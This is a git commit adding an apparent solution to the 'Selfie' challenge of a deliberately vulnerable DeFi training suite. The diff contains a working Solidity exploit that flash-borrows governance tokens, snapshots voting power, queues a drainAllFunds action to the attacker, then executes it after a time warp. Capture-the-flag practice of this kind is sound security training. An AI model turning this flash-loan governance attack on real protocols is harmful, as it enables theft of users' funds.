f9b95551c4584dd126ec75068ed4c6cd76f89f66
flaskr <flaskr@users.noreply.github.com>
2022-06-11 16:10:34 +0800

    answer for SelfiePool

--- test/Levels/selfie/Selfie.t.sol
+++ test/Levels/selfie/Selfie.t.sol
@@ -8,6 +8,42 @@ import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableToke
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
+contract LoanSnapshot {
+
+    address public selfiePoolAddress;
+    address public attacker;
+    SimpleGovernance public simpleGovernance;
+
+    constructor(address _selfiePoolAddress, address _attacker, address _simpleGov) {
+        attacker = _attacker;
+        selfiePoolAddress = _selfiePoolAddress;
+        simpleGovernance = SimpleGovernance(_simpleGov);
+    }
+
+    function flashLoanAttack() external returns (uint256 actionId) {
+        SelfiePool selfiePool = SelfiePool(selfiePoolAddress);
+        selfiePool.flashLoan(1_500_000e18);
+
+        // invoke governance to drain pool
+        actionId = simpleGovernance.queueAction(
+            address(selfiePool),
+            abi.encodeWithSignature(
+                "drainAllFunds(address)",
+                attacker
+            ),
+            0
+        );
+    }
+
+    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
+        DamnValuableTokenSnapshot dvt = DamnValuableTokenSnapshot(tokenAddress);
+        // invoke snapshot
+        dvt.snapshot();
+        // return borrowed tokens
+        dvt.transfer(selfiePoolAddress, borrowAmount);
+    }
+}
+
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
     uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
@@ -45,6 +81,10 @@ contract Selfie is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        LoanSnapshot loanSnapshotter = new LoanSnapshot(address(selfiePool), attacker, address(simpleGovernance));
+        uint256 actionId = loanSnapshotter.flashLoanAttack();
+        vm.warp(block.timestamp + 2 days);
+        simpleGovernance.executeAction(actionId);
 
         /** EXPLOIT END **/
         validation();
